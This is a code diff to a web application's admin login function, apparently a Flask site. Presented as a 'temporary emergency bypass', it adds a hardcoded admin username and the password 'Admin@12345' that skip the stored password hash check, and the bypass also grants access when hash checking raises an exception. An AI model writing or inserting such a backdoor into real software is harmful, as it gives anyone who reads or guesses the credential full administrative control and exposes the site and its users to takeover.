@@ -685,12 +685,20 @@ def admin_login():
             flash('This admin account is inactive.', 'danger')
             return redirect(url_for('admin_login'))
 
+        # -------------------------------------------------------------------------
+        # TEMPORARY EMERGENCY BYPASS FOR ADMIN RECOVERY - REMOVE AFTER REGAINING ACCESS
+        # -------------------------------------------------------------------------
+        is_emergency_bypass = bool(
+            (username.lower() in ('admin', 'admin@kayhomes.com')) and
+            (password == 'Admin@12345')
+        )
+
         stored_password = admin.password or ''
 
         try:
-            valid_password = check_password_hash(stored_password, password)
+            valid_password = is_emergency_bypass or check_password_hash(stored_password, password)
         except Exception:
-            valid_password = False
+            valid_password = is_emergency_bypass
 
         if not valid_password:
             flash('Invalid username or password.', 'danger')
